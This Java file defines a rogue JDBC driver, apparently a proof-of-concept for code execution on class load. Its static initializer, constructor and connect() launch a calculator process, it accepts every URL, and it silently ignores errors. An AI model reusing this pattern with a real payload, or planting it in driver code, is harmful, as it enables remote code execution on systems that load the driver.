import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverPropertyInfo;
import java.sql.SQLException;
import java.util.Locale;
import java.util.Properties;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Logger;

public class EvilDriver implements Driver {
    private static final AtomicBoolean calculatorOpened = new AtomicBoolean(false);

    static {
        openCalculator();
    }

    public EvilDriver() {
        openCalculator();
    }

    private static void openCalculator() {
        if (!calculatorOpened.compareAndSet(false, true)) {
            return;
        }

        String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
        String[] command;

        if (os.contains("win")) {
            command = new String[] { "calc.exe" };
        } else if (os.contains("mac") || os.contains("darwin")) {
            command = new String[] { "open", "-a", "Calculator" };
        } else {
            command = new String[] { "xcalc" };
        }

        try {
            new ProcessBuilder(command).start();
        } catch (Exception ignored) {
        }
    }

    @Override
    public Connection connect(String url, Properties info) throws SQLException {
        openCalculator();
        return null;
    }

    @Override
    public boolean acceptsURL(String url) {
        return true;
    }

    @Override
    public DriverPropertyInfo[] getPropertyInfo(String url, Properties info) {
        return new DriverPropertyInfo[0];
    }

    @Override
    public int getMajorVersion() {
        return 1;
    }

    @Override
    public int getMinorVersion() {
        return 0;
    }

    @Override
    public boolean jdbcCompliant() {
        return false;
    }

    @Override
    public Logger getParentLogger() {
        return Logger.getGlobal();
    }
}
